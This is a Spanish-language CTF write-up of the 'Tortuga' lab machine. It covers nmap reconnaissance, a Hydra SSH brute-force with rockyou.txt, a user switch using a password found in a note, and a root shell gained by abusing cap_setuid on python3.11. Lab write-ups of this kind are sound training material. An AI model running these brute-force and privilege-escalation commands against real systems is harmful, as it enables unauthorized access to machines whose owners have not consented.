# Tortuga CTF - Writeup

## 1. Resumen
Este documento describe el proceso de resolución de la máquina **Tortuga** de *The Hackers Labs*. El objetivo es comprometer el sistema objetivo, obtener acceso inicial y escalar privilegios hasta convertirse en **root**. Se emplearon herramientas clásicas de pentesting como **Nmap**, **Hydra** y el análisis de **Linux Capabilities**.

---

## 2. Fase de Reconocimiento

### 2.1 Escaneo con Nmap
Comenzamos con un escaneo completo de puertos y detección de servicios:

```bash
sudo nmap -p- --open -sCV -Pn -n <IP>
```

**Parámetros:**
- `-p-`: Escanea todos los puertos (1-65535)
- `--open`: Muestra solo puertos abiertos
- `-sCV`: Scripts por defecto + detección de versiones
- `-Pn`: Omite el ping previo (en nuestro caso, a principio la máquina no respondía al ping)
- `-n`: No resuelve DNS

**Resultados principales:**
```
22/tcp  open  ssh     OpenSSH 9.2p1 Debian
80/tcp  open  http    Apache httpd 2.4.62 (Debian)
```

**Análisis:**
- **Puerto 22 (SSH):** Posible vector de fuerza bruta. (vamos entrar por acá :)
- **Puerto 80 (HTTP):** Sitio web activo que podría contener información sensible y pistas ocultas. Navegando por esta web encontramos indicios importantes para avanzar en el CTF.
---

## 3. Exploración del Servicio Web

Al acceder vía navegador encontramos una página con secciones que contenían pistas. En `mapa.php` se mencionaba un **usuario grumete**, sugiriendo un posible objetivo para SSH.

---

## 4. Ataque de Fuerza Bruta SSH

Utilizamos **Hydra** con el diccionario **rockyou.txt**:

```bash
hydra -l grumete -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

**Explicación:**
- `-l grumete`: Usuario identificado.
- `-P rockyou.txt`: Diccionario de contraseñas.
- `ssh://<IP>`: Servicio objetivo.

**Resultado:**
```
password:1234
```

Accedemos con éxito vía SSH:

```bash
ssh grumete@<IP>
```

---

## 5. Movimiento Lateral

Al explorar el sistema, encontramos otro usuario llamado **capitan** en `/etc/passwd`. Una nota oculta revelaba su contraseña, permitiendo cambiar de usuario:

```bash
su capitan
```

Este movimiento corresponde a una **escalada de privilegios horizontal**.

---

## 6. Escalada de Privilegios a Root

### 6.1 Enumeración de Capabilities
Buscamos **Linux Capabilities**:

```bash
getcap -r / 2>/dev/null
```

**Resultado:**
```
/usr/bin/python3.11 = cap_setuid+ep
```

### 6.2 Análisis
La capability **cap_setuid** permite a un proceso cambiar su UID. Si se abusa en Python, podemos elevarnos a root.

### 6.3 Explotación
Ejecutamos:

```bash
python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Obtenemos shell como **root**.

---

## 7. Búsqueda de la Flag

```bash
find / -name root.txt 2>/dev/null
```

Una vez localizada, podemos leerla:

```bash
cat /ruta/a/root.txt
```

---

## 8. Conceptos Técnicos Explicados

### 8.1 Linux Capabilities
Son fragmentos de privilegios de root que se pueden asignar a binarios. Permiten mayor granularidad en lugar de otorgar permisos completos.

### 8.2 Riesgo de `cap_setuid`
Normalmente un usuario no puede cambiar su UID. Con esta capability, Python puede ejecutar código como root, abriendo la puerta a una **escalada vertical de privilegios**.

---

## 9. Conclusiones

Esta máquina refleja una cadena de ataque clásica:
- Reconocimiento con **Nmap**.
- Fuerza bruta con **Hydra**.
- Escalada horizontal mediante credenciales.
- Explotación de **capabilities** para root.

📌 Lección clave: configuraciones inseguras en servicios y permisos pueden comprometer todo un sistema.



by Qb1t